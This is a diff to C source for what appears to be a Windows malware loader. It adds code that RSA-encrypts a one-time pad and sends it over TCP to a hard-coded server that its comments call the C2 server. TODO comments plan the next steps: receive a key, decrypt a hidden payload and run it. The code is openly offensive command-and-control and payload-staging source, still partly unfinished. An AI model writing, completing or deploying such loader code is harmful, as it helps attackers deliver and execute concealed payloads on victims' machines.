@@ -44,6 +44,7 @@ if( CryptImport ) {
     CERT_PUBLIC_KEY_INFO *PubKeyInfo;
     DWORD PubKeyInfoLen;
     BCRYPT_KEY_HANDLE hkey;
+    BYTE* recvData;
     /*HCRYPTPROV hProvRSA = 0;
     HCRYPTKEY hKeyRSA = 0;*/
 /*
@@ -130,56 +131,92 @@ if( CryptImport ) {
 	/*
  	* Encrypt the one time pad with the RSA key
  	*/
-
+		
+	
 	if(BCryptEncrypt(hkey,(PUCHAR)(OTP), AESKEYLEN, NULL,NULL,0, NULL,0/* Ignored because pbOutput is null*/, &EncryptedOTPLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
 	{
 		printf("error in calculating RSA output key length.");
 		exit(0);
 	}
-
-	printf("\nEncryptedOTPLen: %d", EncryptedOTPLen);
-
 	/*
  	* Encrypt the one time pad with the RSA key
  	*/
-
 	if(BCryptEncrypt(hkey,(OTP), AESKEYLEN, NULL,NULL,0, EncryptedOTP,  EncryptedOTPLen, &EncryptedOTPWriteLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
 	{
 		printf("ERROR IN ENCRYPTING");
 		exit(0);
 	}
-
+	/*
+ 	* destroy are public key in a sane manner
+ 	*/
+	
+	if(BCryptDestroyKey(hkey) != STATUS_SUCCESS){
+		printf("Error in destroying key");
+		exit(0);
+	}
 	/*
  	 *  Configure socket descriptor and set the socket IP address
  	 */
-    if (WSAStartup(0x0202,&wsaData))
+	
+	if (WSAStartup(0x0202,&wsaData))
+    	{
+		init.ai_family = AF_INET; // IPV4 address
+   		init.ai_socktype = SOCK_STREAM; //define a reliable connection
+    		init.ai_protocol = IPPROTO_TCP; // tcp because it's stable
+	}
+	if(getaddrinfo(IPADDR_SVR,PORT_SVR,&init,&result) == INVALID_SOCKET)
+        	exit(-1);
 
-    init.ai_family = AF_INET; // IPV4 address
-    init.ai_socktype = SOCK_STREAM; //define a reliable connection
-    init.ai_protocol = IPPROTO_TCP; // tcp because it's stable
-
-    if(getaddrinfo(IPADDR_SVR,PORT_SVR,&init,&result) == INVALID_SOCKET)
-        exit(-1);
-
-    if((Connection = socket(result->ai_family, result->ai_socktype, result->ai_protocol))==INVALID_SOCKET)
-    {
-        freeaddrinfo(result);
-        WSACleanup();
-        exit(0);
-    }
+    	if((Connection = socket(result->ai_family, result->ai_socktype, result->ai_protocol))==INVALID_SOCKET)
+    	{
+        	freeaddrinfo(result);
+        	WSACleanup();
+        	exit(0);
+    	}
+	
 /*
  * Attempt to connect to the C2 server to retrieve the keys necessary to decrypt
  * the payolad section, for this to work this client transmits a OTP that has been
  * encrypted using an RSA public key (Length defined by the Conf file, default 4096)
  */
-     if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
-    {
-        
-        exit(-1);
-    }
+     	if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
+     	{   
+        	exit(-1);
+     	}
 
+	EncryptedOTPWriteLen = htonl(EncryptedOTPWriteLen);
+
+	if(!send(Connection,(BYTE*)&EncryptedOTPWriteLen ,sizeof(ULONG),0))
+	{
+		exit(-1);
+	}
+	recvData = malloc(1);
+	/*
+	 * recieve a syncronizatioon byte to ensure data is recieved appropriatly. 
+	 */
+	if(!recv(Connection,recvData,1,0))
+	{
+		exit(-1);
+	} 
+	/*
+	 * send the EncryptedOTP to the server
+	 */
+	EncryptedOTPWriteLen = ntohl(EncryptedOTPWriteLen);
+	
+	if(!send(Connection,(BYTE*)EncryptedOTP,EncryptedOTPWriteLen, 0))
+	{
+		printf("error sending EncryptedOTP (%d bytes).",EncryptedOTPWriteLen);
+		exit(-1);
+	}
+	closesocket(Connection);
+	 for(int x = 0 ; x < EncryptedOTPWriteLen; x++){
+		 printf("0x%02x ",*(EncryptedOTP+x));
+	 }
+	/*
+	 * send the EncryptedOTP to the server
+	 */
 /** TODO
- * SEND ENCRYPTED OTP
+  SEND ENCRYPTED OTP
  * RECIVE PAYLOAD ENCRYPTION KEY
  * USE OTP TO RETRIVE AES KEY
  */
@@ -192,7 +229,7 @@ if( CryptImport ) {
                   * give this information to the OS
                   */
 /** TODO
- *  DECRYPT PAYLOAD
+ *  DECYPT PAYLOAD
  *  RUN PAYLOAD
  */
 return 0;
